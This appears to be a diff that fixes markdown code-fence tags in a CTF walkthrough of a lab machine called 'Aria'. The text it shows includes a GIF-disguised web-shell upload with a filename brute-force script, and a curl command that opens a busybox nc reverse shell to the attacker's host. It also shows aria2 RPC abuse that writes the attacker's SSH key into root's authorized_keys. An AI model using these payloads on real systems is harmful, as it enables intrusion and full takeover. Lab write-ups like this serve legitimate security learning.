@@ -42,7 +42,7 @@ PORT     STATE SERVICE VERSION
 |   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, RPCCheck: 
 |     --- Aria Debug Shell ---
 |     Type 'exit' to quit ---
-```
+```python
 
 The results showed 3 open ports:
 
@@ -55,12 +55,11 @@ The results showed 3 open ports:
 I started interacting with the website. It’s an image upload site, so I tried common techniques to bypass the file extension restriction, but they didn’t work. Then I tested different headers for various image types like JPEG and GIF, and the GIF header (`GIF89a`) worked.
 
 After finding the right header, I injected a simple web shell using `' >shell.gif
-```python
 
 The problem now was to brute-force the file name to find the uploaded web shell. I tried manually retrieving the timestamp by manipulating JavaScript, editing the HTML, and experimenting in the browser console, but nothing worked. The brute-force script I wrote also failed. I then checked port 1337 while uploading to see if something appeared there, but nothing showed up.  
 So, I created a Python script to generate the payload and retrieve the correct timestamp automatically. I think that was the main issue with the first script because I had to provide the timestamp manually. This new script uploads the payload and brute-forces the URL until it finds the correct web shell location.
 
-```
+```python
 import hashlib
 import time
 import requests
@@ -125,26 +124,26 @@ When the script finds the URL for the GIF, stop it manually (Ctrl+C) since it wo
 
 After obtaining the web shell, we can set up a listener:
 
-```
-ζ curl http://192.168.138.122/uploads/fcaf664b8ea59a3ea0470d79fbbeae7f.gif\?commande\=busybox%20nc%20192.168.138.102%204444%20-e%20%2Fbin%2Fbash
 ```bash
+ζ curl http://192.168.138.122/uploads/fcaf664b8ea59a3ea0470d79fbbeae7f.gif\?commande\=busybox%20nc%20192.168.138.102%204444%20-e%20%2Fbin%2Fbash
+```
 
 Start a listener with Netcat:
 
-```
+```bash
 ζ nc -vlnp 4444                                                                                                   
 listening on [any] 4444 ...
 connect to [192.168.138.102] from (UNKNOWN) [192.168.138.122] 47320
 whoami
 www-data
-```bash
+```
 
 We’re inside the machine as `www-data`. Next, we’ll check if we can escalate to the user.  
 By the way, we can already read the user flag with our current privileges.
 
 I tried several times to see if there was any database or sensitive file that could lead to the user, but one thing stood out: a local service running on port 6800.
 
-```
+```bash
 www-data@Aria:/var/www/html/uploads$ ss -nltp
 ss -nltp
 State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    
@@ -154,29 +153,29 @@ LISTEN    0         128              127.0.0.1:6800             0.0.0.0:*
 LISTEN    0         128                   [::]:22                  [::]:*       
 LISTEN    0         128                      *:80                     *:*       
 LISTEN    0         128                  [::1]:6800                [::]:*
-```bash
+```
 
 When I ran `ps aux`, I saw `/usr/bin/aria` running as **root**:
 
-```
+```bash
 www-data@Aria:/var/www/html/uploads$ ps aux
 
 USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 
 root         338  0.0  0.1  56660  3464 ?        Ss   16:44   0:00 /usr/bin/aria
 
-```bash
+```
 
 So, I decided to interact with `aria2` using curl:
 
-```
+```bash
 www-data@Aria:/home/aria$ curl -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":"1","method":"aria2.getVersion"}' http://localhost:6800/jsonrpc
 {"id":"1","jsonrpc":"2.0","error":{"code":1,"message":"Unauthorized"}}
-```bash
+```
 
 We don’t have authorization, so we need a token or session. I suspected steganography might be involved, so I used `xxd` on several files and found something interesting in `user.txt`:
 
-```
+```bash
 www-data@Aria:/home/aria$ which xxd
 which xxd
 /usr/bin/xxd
@@ -208,11 +207,11 @@ xxd user.txt
 00000170: e280 8be2 808c e280 8be2 808c e280 8be2  ................
 00000180: 808c e280 8ce2 808b e280 8be2 808b e280  ................
 00000190: 8ce2 808c                                ....
-```bash
+```
 
 With some help from CHATGPT, I realized there were hidden characters in the flag (zero-width characters). Using stegzero.com didn’t work , so I wrote a script to decode Zero-Width Space (ZWSP) and Zero-Width Non-Joiner (ZWNJ) characters.
 
-```
+```bash
 #!/usr/bin/env python3
 # zw_decode.py
 # Usage: python zw_decode.py input.txt
@@ -249,33 +248,33 @@ except:
     decoded = repr(bytes(out))
 
 print(decoded)
-```bash
+```
 
 This script decodes the hidden message and reveals the token:
 
-```
+```bash
 ζ python3 decode1.py user.txt                                                                                                     
 token: maze-sec
-```bash
+```
 
 Now that we have the token, let’s go back to `aria` and use curl again. With this token, I tried overwriting `/etc/passwd` and creating a malicious SUID binary, but it didn’t work. Then I tried using my own `attacker.pub` as an authorized key and it worked.
 
-```
+```bash
 www-data@Aria:/tmp$ curl -H "Content-Type: application/json" -H "Authorization: Bearer maze-sec" -X POST http://localhost:6800/jsonrpc -d '{"jsonrpc": "2.0", "id": "1", "method": "aria2.addUri", "params": ["token:maze-sec", ["http://192.168.138.102/attacker.pub"], {"dir": "/root/.ssh/", "out": "authorized_keys"}]}'
 {"id":"1","jsonrpc":"2.0","result":"075d4bdd168c83e0"}
-```bash
+```
 
 Before executing this command, set up a local web server hosting your SSH public key:
 
-```
+```bash
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.138.122 - - [05/Oct/2025 18:31:17] "GET /attacker.pub HTTP/1.1" 200 -
-```bash
+```
 
 Finally, connect as root using your private key:
 
-```
+```text
 ζssh root@192.168.138.122 -i attacker
 Linux Aria 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
 
@@ -286,8 +285,7 @@ individual files in /usr/share/doc/*/copyright.
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 root@Aria:~#
-```text
+```
 
 **ROOTED**
 
-```
